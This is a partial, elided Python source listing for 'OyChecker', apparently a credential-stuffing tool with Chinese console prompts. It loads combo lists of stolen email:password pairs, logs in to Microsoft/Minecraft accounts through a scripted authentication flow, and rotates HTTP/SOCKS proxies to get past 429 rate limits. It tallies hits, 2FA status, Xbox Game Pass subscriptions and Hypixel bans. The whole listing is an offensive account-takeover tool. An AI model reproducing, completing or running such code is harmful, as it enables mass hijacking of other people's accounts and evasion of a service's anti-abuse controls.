...
logo = Fore.GREEN+'''
 ...
 | | | | | | | |   | '_ \ / _ \/ __| |/ / _ | '__|
 | |_| | |_| | |___| | | |  __| (__|   |  __| |   
  \___/ \__, |\____|_| |_|\___|\___|_|\_\___|_|   
        |___/                                     
 \n'''
            ...
            while tries < maxretries:
                try:
                    ...
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(10)
            ...
            while tries < maxretries:
                ...
                try:
                    ...
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned == None or c < 500:
                            time.sleep(.005)
                            c+=1
    ...
    while retry_count < max_retries:
        try:
            ...
            if checkrq.status_code == 200:
                ...
                retry_count += 1
                session.proxy = getproxy()
                wait_time = 5 if len(proxylist) < 10 else 2
    ...
    while True:
        try:
            ...
            if mc_login.status_code == 429:
                session.proxy = getproxy()
                if len(proxylist) < 1: time.sleep(10)
                continue
            else:
...
def authenticate(email, password):
    ...
    while current_try < max_tries:
        try:
            ...
            if urlPost is None:
                raise Exception("Failed to get sFTTag")
...
def cuiscreen():
    ...
    utils.set_title(f"OyChecker | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
...
def banproxyload():
    global banproxies
    proxyfile = filedialog.askopenfile(mode='rb', title='选择一个 SOCKS5 Proxy 文件', filetypes=(("txt", "*.txt"), ("All files", "*.*")))
    if proxyfile is None:
        ...
        try:
            ...
            print(Fore.LIGHTBLUE_EX+f"加载 [{len(banproxies)}] 条路线.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"您的文件可能已损坏.")
            time.sleep(2)
            banproxyload()

def Main():
    global proxytype, screen
    utils.set_title("OyChecker")
    os.system('clear')
    try:
        loadconfig()
    except:
        print(Fore.RED+"加载配置时出错。也许你正在使用较旧的配置？如果是，请删除旧配置并重新打开 OyChecker.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(检查速度，我建议设置为100，如果慢的话可以增加线程。如果不用代理，最多开5个线程.)")
        thread = int(input(Fore.LIGHTBLUE_EX+"线程: "))
    except:
        print(Fore.LIGHTRED_EX+"必须是一个数字.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"代理类型: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None - [5] 自动检测")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(Fore.RED+f"错误的代理类型 [{cleaned}]")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"显示模式: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"选择你的combo")
    Load()
    if cleaned not in [4, 5]:
        print(Fore.LIGHTBLUE_EX+"选择你的代理")
        Proxys()
    if config.get('proxylessban') == False and config.get('hypixelban') is True:
        print(Fore.LIGHTBLUE_EX+"选择您的 SOCKS5 代理.")
        banproxyload()
    if cleaned == 5:
        print(Fore.LIGHTGREEN_EX+"检测代理中，请等待.")
